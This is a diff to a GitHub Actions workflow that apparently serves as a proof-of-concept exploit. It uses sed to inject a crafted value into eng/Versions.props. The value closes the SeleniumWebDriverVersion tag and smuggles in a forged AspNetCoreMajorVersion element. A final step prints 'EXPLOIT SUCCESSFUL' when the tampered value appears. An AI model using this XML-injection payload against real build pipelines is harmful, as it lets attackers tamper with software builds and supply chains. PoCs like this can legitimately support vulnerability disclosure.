@@ -10,7 +10,23 @@ jobs:
       - name: "Clone Repository"
         uses: actions/checkout@v4
 
-      - name: "Inject Malicious Metadata"
-        id: metadata
+      - name: "Execute Vulnerable Logic"
         run: |
-          echo 'payload=1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
+          TARGET_FILE="eng/Versions.props"
+          # Hum direct payload ko variable mein daal rahe hain (No GITHUB_OUTPUT needed)
+          VALUE="1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>"
+          
+          echo "[*] Processing automated update..."
+          sed -i "s@<SeleniumWebDriverVersion>.*</SeleniumWebDriverVersion>@<SeleniumWebDriverVersion>$VALUE</SeleniumWebDriverVersion>@" "$TARGET_FILE"
+
+      - name: "Verify Infrastructure Compromise"
+        run: |
+          echo "=== SECURITY AUDIT REPORT ==="
+          grep "AspNetCoreMajorVersion" eng/Versions.props
+          
+          if grep -q "999" eng/Versions.props; then
+             echo "🚨 EXPLOIT SUCCESSFUL: SECURITY BOUNDARY BYPASSED!"
+          else
+             echo "[-] Exploit failed."
+             exit 1
+          fi
